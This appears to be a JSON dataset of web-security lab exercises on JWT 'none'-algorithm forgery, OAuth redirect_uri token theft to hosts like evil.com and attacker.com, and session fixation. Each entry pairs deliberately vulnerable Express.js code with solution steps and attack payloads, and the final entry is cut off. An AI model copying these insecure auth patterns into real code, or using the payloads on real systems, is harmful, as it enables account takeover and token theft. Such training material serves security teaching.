[
    {
      "Lab scenario": "JWT token tampering vulnerability in session management",
      "Lab Description": "The application uses JWTs for user sessions, but incorrectly trusts the `alg` header from the token instead of enforcing HS256. This allows an attacker to forge tokens by setting the algorithm to 'none'. The application fails to verify the token signature properly. To solve: forge an administrator JWT and access the admin dashboard.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite or Postman to log in and capture the issued JWT from the Authorization header.",
        "Decode the JWT using jwt.io or jwt-tool to view its header and payload.",
        "Modify the header to { \"alg\": \"none\" } and set payload to { \"username\": \"admin\" }",
        "Remove the signature part of the JWT and resend the forged token via Authorization: Bearer [token]",
        "Visit /admin/dashboard to confirm admin access"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecretkey'; app.use(express.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.payload.username === 'admin') { res.send('Welcome Admin'); } else { res.status(403).send('Access Denied'); } }); app.listen(3000, () => console.log('JWT Lab running'));",
      "payloads": [
        "{\"alg\":\"none\"}.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
        "Authorization: Bearer [header].[payload]."
      ]
    },
    {
      "Lab scenario": "OAuth redirection hijack in authentication flow",
      "Lab Description": "The application uses OAuth for login via a third-party provider, but fails to validate the redirect_uri parameter. This allows attackers to hijack the token and redirect it to their own malicious domain. To solve: steal the victim’s token by injecting a malicious redirect_uri and access their data.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to initiate an OAuth login and intercept the authorization request.",
        "Modify the redirect_uri parameter to point to your controlled domain (e.g. https://attacker.com/oauth-capture).",
        "Send the modified URL to the victim and wait for them to authorize it.",
        "Capture the token in your controlled domain.",
        "Use the token in the Authorization header to access /user/profile endpoint"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const redirect = req.query.redirect_uri; const token = 'victimToken123'; res.redirect(`${redirect}?access_token=${token}`); }); app.get('/user/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'victimToken123') { res.send('Sensitive profile data for victim'); } else { res.status(403).send('Access denied'); } }); app.listen(4000, () => console.log('OAuth Lab running'));",
      "payloads": [
        "https://vulnerable.com/auth?redirect_uri=https://evil.com/oauth-capture",
        "Authorization: Bearer victimToken123"
      ]
    },
    {
      "Lab scenario": "Session fixation vulnerability in login flow",
      "Lab Description": "The application sets a session ID cookie before authentication and does not regenerate it upon successful login. An attacker can set a known session ID for a victim before they log in and later use that session ID to access the victim's account. To solve: log in as the victim using a fixed session ID to hijack the session.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Send a GET request to the login page and observe the Set-Cookie: sessionId=abc123",
        "Send the same cookie to the victim and trick them into logging in while using sessionId=abc123",
        "Once the victim logs in, their session is tied to sessionId=abc123",
        "Reuse that session cookie in your browser or Burp",
        "Access /dashboard to confirm you are logged in as the victim"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); const sessions = {}; const users = [{ username: 'victim', password: 'pass123' }]; app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); app.get('/login', (req, res) => { res.cookie('sessionId', 'abc123'); res.send('<form method=\"POST\">Username: <input name=\"username\"/><br>Password: <input name=\"password\"/><br><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions['abc123'] = username; res.redirect('/dashboard'); } else { res.send('Login failed'); } }); app.get('/dashboard', (req, res) => { const user = sessions[req.cookies.sessionId]; if (user) res.send(`Welcome ${user}`); else res.status(403).send('Unauthorized'); }); app.listen(3000, () => console.log('Session Fixation Lab running'));",
      "payloads": [
        "Cookie: sessionId=abc123",
        "POST /login with username=victim&password=pass123 (from victim’s browser with injected sessionId=abc123)",
        "GET /dashboard with Cookie: sessionId=abc123"
      ]
    },
    {
      "Lab scenario": "JWT tampering via 'none' algorithm in Authorization header",
      "Lab Description": "The application uses JSON Web Tokens (JWTs) for user authentication. However, it fails to enforce algorithm validation, allowing tokens signed with 'none' to bypass verification. The application trusts the 'alg' value in the header and processes the token without signature validation. To solve: Craft a tampered token granting 'admin' access and use it to access the admin dashboard.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Capture a JWT token from an authenticated request using Burp Suite.",
        "Decode the JWT using jwt.io and observe the algorithm set as 'HS256'.",
        "Replace the 'alg' header with 'none' and modify the payload to { \"username\": \"admin\" }.",
        "Remove the signature and reconstruct the token as header.payload (omit the third part).",
        "Send a GET request to /admin with the forged JWT in the Authorization header to gain access."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'secretkey123'; app.use(require('body-parser').json()); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); const payload = jwt.verify(token, secret, { algorithms: [decoded.header.alg] }); if (payload.username === 'admin') res.send('Welcome Admin!'); else res.status(403).send('Access Denied'); }); app.listen(4000, () => console.log('JWT None Algo Lab running'));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
        "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
      ]
    },
    {
      "Lab scenario": "Session fixation via predictable session ID in login flow",
      "Lab Description": "The application accepts user-provided session IDs via cookies before login, without regenerating them after successful authentication. This allows attackers to set a known session ID before the victim logs in. To solve: Fixate a session, wait for the victim to authenticate, and hijack their session to access their profile.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use OWASP ZAP to intercept a pre-login request and inject a custom session cookie like sessionid=attacker123.",
        "Send the link with embedded cookie to the victim (assume social engineering succeeded).",
        "Wait until the victim logs in and the same session ID becomes authenticated.",
        "Reuse the sessionid=attacker123 from your browser to access the victim's /profile page.",
        "Verify successful session takeover by checking personal details on the profile page."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'vulnsecret', resave: false, saveUninitialized: true })); app.use(require('body-parser').urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'hunter2' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Login failed'); req.session.username = user.username; res.send('Logged in successfully'); }); app.get('/profile', (req, res) => { if (!req.session.username) return res.status(403).send('Not authenticated'); res.send(`Welcome ${req.session.username}, this is your profile.`); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
      "payloads": [
        "Cookie: sessionid=attacker123",
        "Set-Cookie: sessionid=attacker123; Path=/; HttpOnly"
      ]
    },
    {
      "Lab scenario": "OAuth implicit flow misconfigured with open redirect on callback",
      "Lab Description": "The application uses OAuth 2.0 with the implicit grant type. The redirection URI is not strictly validated, allowing an attacker to intercept the access token via a malicious redirect URL. To solve: Craft an authorization URL with a redirect_uri pointing to your attacker-controlled site and steal the victim's token.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Postman to inspect the OAuth flow and discover the redirect_uri parameter is not validated.",
        "Craft an authorization URL using the victim’s client_id and set redirect_uri to https://attacker.com/capture.",
        "Send the link to the victim. Once clicked, the access_token is included in the fragment of the redirected URL.",
        "On https://attacker.com/capture, use JavaScript to parse the token and send it to your attacker server.",
        "Replay the stolen token in the Authorization header to access /account as the victim."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const clients = [{ client_id: 'trusted-client', redirect_uri: 'https://victim.com/callback' }]; const tokens = {}; app.get('/authorize', (req, res) => { const { response_type, client_id, redirect_uri } = req.query; if (!clients.find(c => c.client_id === client_id)) return res.status(400).send('Invalid client');  let token = 'access-token-xyz'; tokens[client_id] = token; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (Object.values(tokens).includes(token)) res.send('Welcome to your account'); else res.status(403).send('Invalid token'); }); app.listen(4000, () => console.log('OAuth Open Redirect Lab running'));",
      "payloads": [
        "https://vulnerable-oauth.com/authorize?response_type=token&client_id=trusted-client&redirect_uri=https://attacker.com/capture",
        "https://attacker.com/capture#access_token=access-token-xyz"
      ]
    },
    {
      "Lab scenario": "Session Fixation in Cookie-based Authentication",
      "Lab Description": "The application uses a session cookie to manage authenticated state. However, it accepts arbitrary session IDs from unauthenticated users and does not regenerate the session ID after login, enabling session fixation. The application fails to invalidate old sessions. To solve: Hijack Carlos's session by fixing a session ID before login and accessing his account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to intercept a request to GET /login and manually set a crafted session cookie like sessionid=attacker123",
        "Forward the request and log in using Carlos's credentials while keeping the session ID fixed",
        "Confirm that the server maintains the same sessionid after login (check in Burp Repeater)",
        "Use Postman or your browser to access /my-account using the sessionid=attacker123 as a cookie",
        "Verify access to Carlos's account without knowing his credentials"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'password123' }]; let sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const sid = req.cookies.sessionid || Math.random().toString(36).substring(2); sessions[sid] = username; res.cookie('sessionid', sid); res.send(`Welcome, ${username}`); }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.sessionid]; if (!username) return res.status(403).send('Not logged in'); res.send(`Account page of ${username}`); }); app.listen(4000);",
      "payloads": [
        "Cookie: sessionid=attacker123",
        "POST /login with sessionid=attacker123 and carlos's credentials",
        "GET /my-account with sessionid=attacker123"
      ]
    },
    {
      "Lab scenario": "JWT Tampering in Bearer Token Authentication",
      "Lab Description": "The application uses JWTs to manage user sessions, but fails to verify the signing algorithm correctly. By modifying the JWT to use 'alg':'none' and removing the signature, an attacker can spoof any user's token. To solve: Tamper with a JWT to impersonate Carlos and access the protected dashboard.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite or Postman to intercept an authenticated request and copy the JWT",
        "Decode the JWT using jwt.io or CyberChef, and change the payload to {\"username\": \"carlos\"} and header to {\"alg\":\"none\"}",
        "Remove the signature portion of the JWT (leave two parts only)",
        "Use the modified token in the Authorization: Bearer header to access /dashboard",
        "Verify Carlos's dashboard loads, confirming privilege escalation"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'secret123'; app.use(require('body-parser').json()); app.get('/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.username) return res.send(`Welcome, ${payload.username}`); return res.status(403).send('Invalid token'); } try { const user = jwt.verify(token, secret); res.send(`Welcome, ${user.username}`); } catch (e) { res.status(403).send('Invalid JWT'); } }); app.listen(4000);",
      "payloads": [
        "Header: {\"alg\":\"none\"}",
        "Payload: {\"username\":\"carlos\"}",
        "JWT: base64(header).base64(payload). (no signature)",
        "Authorization: Bearer <tampered JWT>"
      ]
    },
    {
      "Lab scenario": "OAuth Misconfiguration in Authorization Flow",
      "Lab Description": "The app uses OAuth 2.0 to authenticate users via a third-party provider, but it exposes the authorization code in a GET request and does not validate the redirect URI. This allows an attacker to intercept a code meant for another user and exchange it for an access token. To solve: Hijack Carlos's OAuth code and access his account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use OWASP ZAP to proxy traffic and monitor the GET /oauth-callback?code=<code> request during login",
        "Trigger Carlos to log in via phishing or clickjacking and capture his code in a malicious redirect URI",
        "Use Postman to craft a POST request to /oauth/token with the stolen code",
        "Use the received access_token to make a GET request to /user-info",
        "Verify access to Carlos's data by confirming his email or username"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/oauth-callback', async (req, res) => { const { code } = req.query; const tokenRes = await axios.post('https://oauth-provider.com/token', { code, client_id: 'xyz', client_secret: 'abc' }); const token = tokenRes.data.access_token; const userRes = await axios.get('https://oauth-provider.com/user', { headers: { Authorization: `Bearer ${token}` } }); res.send(`Logged in as ${userRes.data.username}`); }); app.listen(4000);",
      "payloads": [
        "GET /oauth-callback?code=intercepted-code",
        "POST /oauth/token with intercepted code",
        "GET /user-info with Authorization: Bearer <stolen-token>"
      ]
    },
    {
      "Lab scenario": "JWT Signature Bypass using 'none' algorithm in Authorization Header",
      "Lab Description": "This lab's authentication system uses JWTs to authorize users. The application does not properly validate the JWT algorithm, allowing attackers to set the alg to 'none'. This lets attackers forge tokens without a signature. To solve the lab, craft a JWT to impersonate the user Carlos and access his account page.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Intercept JWT using Burp Suite's Proxy during login request.",
        "Copy the original token and decode it using jwt.io or Burp Decoder.",
        "Change the 'alg' field in header to 'none' and the 'sub' claim to 'carlos'. Remove the signature section.",
        "Send the tampered token using Postman or Burp Repeater in the Authorization: Bearer header.",
        "Access /my-account with the forged token to verify successful bypass."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const users = ['wiener', 'carlos']; app.post('/login', (req, res) => { const { username } = req.body; if (!users.includes(username)) return res.status(403).send('Invalid user'); const token = jwt.sign({ sub: username }, 'secret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; const token = auth.split(' ')[1]; try { const decoded = jwt.verify(token, 'secret'); res.send(`Account page for ${decoded.sub}`); } catch (err) { res.status(401).send('Unauthorized'); } }); app.listen(3000, () => console.log('JWT None Bypass Lab running'));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
        "{\"alg\":\"none\"}.{\"sub\":\"carlos\"}."
      ]
    },
    {
      "Lab scenario": "Session Fixation Vulnerability in Login Flow",
      "Lab Description": "The application sets the session ID before authentication, allowing attackers to fix a victim's session ID. If a victim logs in using the fixed session, the attacker can hijack the session. To solve the lab, fix the session ID for Carlos, wait for login, and hijack his session to access his account.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Send a GET request to /login to obtain a pre-authentication session cookie using Burp or Postman.",
        "Use social engineering or simulate victim login with this fixed session ID (e.g., via stored XSS or link delivery).",
        "After victim logs in, replay the session ID in your own browser using Burp's Cookie editor.",
        "Visit /my-account with the hijacked session.",
        "Verify access to Carlos's account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'pass123' }]; const sessions = {}; app.get('/login', (req, res) => { const sid = Math.random().toString(36).substring(2); res.cookie('sid', sid); res.send('<form method=\"POST\"><input name=\"username\" /><input name=\"password\" /></form>'); }); app.post('/login', (req, res) => { const { sid } = req.cookies; const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user && sid) { sessions[sid] = username; res.send(`Welcome ${username}`); } else { res.status(403).send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sid]; if (user) { res.send(`Account: ${user}`); } else { res.status(401).send('Not authenticated'); } }); app.listen(3000, () => console.log('Session Fixation Lab running'));",
      "payloads": [
        "GET /login -> Set-Cookie: sid=attackersession",
        "Cookie: sid=attackersession after victim logs in",
        "Hijack fixed session cookie post-authentication"
      ]
    },
    {
      "Lab scenario": "OAuth Redirect URI Manipulation Leads to Access Token Theft",
      "Lab Description": "The application uses OAuth 2.0 for login, but does not validate the redirect_uri parameter strictly. An attacker can manipulate this to redirect the OAuth token to a malicious domain. To solve: exploit this flaw to steal Carlos's access token and access his account via the API.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify the OAuth flow and vulnerable endpoint using OWASP ZAP or Burp Suite.",
        "Craft a malicious redirect_uri pointing to your attacker server (e.g., ngrok.io).",
        "Send a phishing link with the malicious redirect_uri to the victim (Carlos).",
        "Capture the access_token in your attacker server logs.",
        "Use Postman or curl with the stolen token to call /api/userinfo and access /my-account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const token = 'access_token_for_carlos'; const uri = `${redirect_uri}?access_token=${token}`; res.redirect(uri); }); app.get('/my-account', (req, res) => { const token = req.query.access_token; if (token === 'access_token_for_carlos') res.send('Carlos Account Accessed'); else res.status(401).send('Invalid token'); }); app.listen(3000, () => console.log('OAuth Redirect URI Lab running'));",
      "payloads": [
        "https://vulnerable-site.com/auth?redirect_uri=https://attacker.com/callback",
        "https://attacker.com/callback?access_token=access_token_for_carlos",
        "GET /my-account?access_token=access_token_for_carlos"
      ]
    },
    {
      "Lab scenario": "Session Fixation via URL Parameter Injection in Login Endpoint",
      "Lab Description": "The login mechanism allows user-supplied session IDs to be set via a query parameter before authentication. The application binds the provided session ID to the authenticated session without validation. To solve: Hijack Carlos's session by forcing him to use a fixed session ID and then authenticate using it.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Use Burp Suite to intercept the login GET request before authenticating. Note that a 'sessionId' parameter can be injected via URL.",
        "2. Log in with your own account using a custom sessionId (e.g., sessionId=abc123). Observe that the server sets this ID as the authenticated session.",
        "3. Host a malicious link (e.g., http://vulnerable.site/login?sessionId=abc123) and trick Carlos into clicking it via social engineering or phishing.",
        "4. Once Carlos uses the link, the session will be fixed. Log in yourself using Carlos’s credentials and confirm the session is shared.",
        "5. Visit /my-account while authenticated to verify you have hijacked Carlos’s session."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const sessions = {}; const users = [{ username: 'carlos', password: 'letmein' }]; app.use((req, res, next) => { let sid = req.query.sessionId || req.cookies.sessionId; if (!sid) { sid = Math.random().toString(36).substring(2); } res.cookie('sessionId', sid); req.session = sessions[sid] = sessions[sid] || {}; next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.send(`Welcome, ${username}`); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { if (req.session.user) res.send(`Account details for ${req.session.user}`); else res.status(401).send('Not authenticated'); }); app.listen(4000, () => console.log('Session Fixation Lab running...'));",
      "payloads": [
        "http://vulnerable.site/login?sessionId=abc123",
        "POST /login with sessionId=abc123 in cookie",
        "Set-Cookie: sessionId=abc123"
      ]
    },
    {
      "Lab scenario": "JWT Authentication Bypass using 'none' Algorithm in Token Verification Logic",
      "Lab Description": "The server uses JWTs for authentication but improperly accepts tokens signed with the 'none' algorithm, trusting unsigned tokens. To solve: Forge a valid JWT for Carlos with 'none' as algorithm, gain access to his account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Use Burp Suite or Postman to log in and capture the Authorization: Bearer <token> header from your response.",
        "2. Decode the JWT at jwt.io and observe the 'alg' field (likely HS256). Change it to 'none' and set payload to {\"username\":\"carlos\"}.",
        "3. Remove the signature part entirely (only header and payload remain, separated by two dots).",
        "4. Replace your Authorization header with the tampered JWT.",
        "5. Visit the /my-account endpoint while authenticated using the fake token to confirm privilege escalation."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'letmein') { const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid'); } }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; const token = authHeader && authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); res.send(`Welcome to ${decoded.username}'s account`); } catch (e) { res.status(403).send('Unauthorized'); } }); app.listen(4000, () => console.log('JWT None Bypass Lab running...'));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "Authorization: Bearer <header>.<payload>.",
        "Header: {\"alg\":\"none\"}, Payload: {\"username\":\"carlos\"}"
      ]
    },
    {
      "Lab scenario": "OAuth Implicit Grant Token Leak via Referer Header in Third-Party Redirect",
      "Lab Description": "The application uses the OAuth implicit grant flow and redirects users to third-party pages after authentication, including the access token in the URL fragment. Due to misconfigured Referer policies, the token leaks to external domains. To solve: Extract Carlos’s access token and impersonate him.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Use OWASP ZAP or Burp Suite to observe the OAuth flow. Note that the redirect_uri includes a third-party page like http://attacker.site/welcome.html#access_token=...",
        "2. Intercept the final OAuth redirect request using a victim account (e.g., Carlos). Confirm that the access token is visible in the Referer header to attacker.site.",
        "3. Set up a malicious third-party page (e.g., using ngrok) that logs document.referrer when the victim lands on it after authentication.",
        "4. Force Carlos to log in via OAuth using a phishing or crafted redirect link.",
        "5. Retrieve the access token from your server logs and use it as Bearer token to access the /my-account endpoint."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const tokens = { 'abc123': 'carlos' }; app.get('/oauth/callback', (req, res) => { const redirectUri = req.query.redirect_uri; const token = 'abc123'; res.redirect(`${redirectUri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = tokens[token]; if (user) res.send(`Sensitive account data of ${user}`); else res.status(403).send('Invalid token'); }); app.listen(4000, () => console.log('OAuth Referer Leak Lab running...'));",
      "payloads": [
        "http://attacker.site/log.html#access_token=abc123",
        "redirect_uri=http://attacker.site/log.html",
        "Referer: http://attacker.site/log.html#access_token=abc123"
      ]
    },
    {
      "Lab scenario": "Session fixation vulnerability in login endpoint",
      "Lab Description": "This lab's login functionality does not invalidate the pre-authentication session identifier, making it vulnerable to session fixation. The application sets a session ID before login and continues using it afterward. To solve: log in to Carlos's account using a fixed session value you've injected before authentication.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1.Using OWASP ZAP, send a GET /login request to observe the initial session ID in the Set-Cookie header.",
        "2.In Postman, craft a login request with valid credentials and reuse the fixed session ID from the previous unauthenticated request.",
        "3.Observe that the session ID remains unchanged even after login.",
        "4.Share the session ID with the victim beforehand, then log in yourself using their credentials while reusing the same ID.",
        "5.Visit /my-account using the fixed session to confirm access to Carlos's account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'fixed-session', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Login failed'); req.session.user = user.username; res.send('Login successful'); }); app.get('/my-account', (req, res) => { if (req.session.user) return res.send(`Welcome ${req.session.user}`); res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
      "payloads": [
        "GET /login → Extract Set-Cookie: sessionID",
        "POST /login with Cookie: sessionID=value",
        "Access /my-account with the same Cookie"
      ]
    },
    {
      "Lab scenario": "JWT tampering via 'none' algorithm in Authorization header",
      "Lab Description": "The application uses JWTs for authentication but does not verify the token signature properly if the 'alg' field is set to 'none'. This flaw allows attackers to craft arbitrary tokens and impersonate users. To solve: forge a JWT token that identifies you as Carlos without knowing the secret key.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1.Use Burp Suite to intercept a request after logging in and extract the JWT from the Authorization header.",
        "2.In jwt.io, decode the token and note the structure (header, payload, signature).",
        "3.Replace the algorithm in the header with 'none' and modify the payload to set the username to carlos.",
        "4.Remove the signature and craft a new token with just the base64url-encoded header and payload.",
        "5.Use Postman to resend a request to /my-account with the forged token in the Authorization header."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username }, secret); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); // FLAW: doesn't verify signature if alg is 'none' if (payload && payload.payload.user) { return res.send(`Welcome ${payload.payload.user}`); } res.status(403).send('Invalid token'); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running'));",
      "payloads": [
        "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
        "Payload: {\"user\":\"carlos\"}",
        "Token: base64url(header).base64url(payload)."
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration in redirect_uri validation during implicit flow",
      "Lab Description": "This lab uses OAuth2 for login via a third-party provider but does not strictly validate the `redirect_uri` during the authorization flow. An attacker can manipulate the URL to capture tokens. To solve: steal Carlos's OAuth token by injecting a malicious redirect URI.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1.In the browser, begin the OAuth login flow and observe the redirect URI being sent.",
        "2.Use Burp Suite to intercept the authorization request and modify the `redirect_uri` to point to your attacker domain (e.g., https://evil.com).",
        "3.Craft a phishing link to the victim using this manipulated redirect URI and send it to Carlos.",
        "4.Once Carlos logs in, the access token is sent to your malicious domain via the fragment (#access_token=...).",
        "5.Use the stolen token in Postman to access /my-account as Carlos by setting the Authorization header."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const validRedirects = ['https://ourapp.com/callback']; app.get('/auth', (req, res) => { const { redirect_uri } = req.query;  res.redirect(`${redirect_uri}#access_token=carlos-token`); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer carlos-token') return res.send('Welcome Carlos'); res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running'));",
      "payloads": [
        "https://authserver.com/auth?redirect_uri=https://evil.com",
        "Victim logs in → access_token is leaked to https://evil.com",
        "Use stolen token: Authorization: Bearer carlos-token"
      ]
    },
    {
      "Lab scenario": "Session fixation in login flow",
      "Lab Description": "The application's login logic is vulnerable to session fixation. The app fails to generate a new session ID after login, allowing an attacker to preset a session ID and force the victim to use it. The application accepts session identifiers via cookies and doesn't invalidate pre-login sessions. To solve: hijack Carlos's session and access the /my-account page using a fixed session.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1.Using Burp Suite, intercept your GET /login request and set a custom cookie: sessionid=attacker123",
        "2.Observe that after a successful login, the same sessionid persists and isn't regenerated.",
        "3.Log out and craft a phishing link containing the fixed session cookie using JavaScript in an HTML email (e.g., <img src='/login' onload='document.cookie=\"sessionid=attacker123\"'>).",
        "4.Send the crafted email to the victim (Carlos) and wait for him to log in while using the fixed session.",
        "5.Once Carlos authenticates using the fixed session, access the /my-account endpoint using the same sessionid=attacker123 cookie."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: false })); app.use(session({ secret: 'static-secret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user.username; return res.redirect('/my-account'); } res.send('Invalid login'); }); app.get('/my-account', (req, res) => { if (req.session.user) return res.send(`Welcome ${req.session.user}`); res.status(401).send('Unauthorized'); }); app.listen(4000);",
      "payloads": [
        "Cookie: sessionid=attacker123",
        "<img src='/login' onload='document.cookie=\"sessionid=attacker123\"'>",
        "GET /my-account HTTP/1.1\\nCookie: sessionid=attacker123"
      ]
    },
    {
      "Lab scenario": "JWT tampering via 'none' algorithm in REST API",
      "Lab Description": "The API uses JWT tokens for user identity validation but insecurely accepts unsigned tokens with the 'none' algorithm. It does not properly verify the signature, allowing attackers to forge arbitrary tokens. To solve: craft a JWT token impersonating Carlos and access the /my-account endpoint.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1.Use Postman to authenticate as a normal user and capture the Authorization: Bearer <JWT> token.",
        "2.Decode the JWT using jwt.io and inspect the header and payload. Note the 'alg': 'HS256'.",
        "3.Craft a new token using header: { \"alg\": \"none\", \"typ\": \"JWT\" } and payload: { \"username\": \"carlos\" }",
        "4.Base64 encode the header and payload, and omit the signature (empty string after two dots).",
        "5.Use Postman to send the forged token in Authorization header and access /my-account."
      ],
      "Vulnerability name": "Authentication",
